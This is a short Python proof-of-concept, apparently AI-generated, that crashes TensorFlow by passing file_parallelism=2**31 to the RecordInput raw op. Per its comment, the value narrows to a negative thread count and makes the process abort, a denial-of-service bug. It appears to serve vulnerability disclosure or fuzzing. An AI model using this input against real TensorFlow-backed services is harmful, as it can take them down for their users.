# AI-generated PoC (black-box). file_parallelism is read as int64 (2**31 = 2147483648) then
# narrowed to a 32-bit thread count downstream, wrapping to negative; ThreadPool's
# CHECK_GE(num_threads, 1) then aborts the whole process (integer-narrowing DoS).
import os
os.environ["TF_CPP_MIN_LOG_LEVEL"]="3"; os.environ["CUDA_VISIBLE_DEVICES"]="-1"
import tensorflow as tf
tf.raw_ops.RecordInput(file_pattern="/tmp/none", file_parallelism=2**31)
print("NO CRASH")
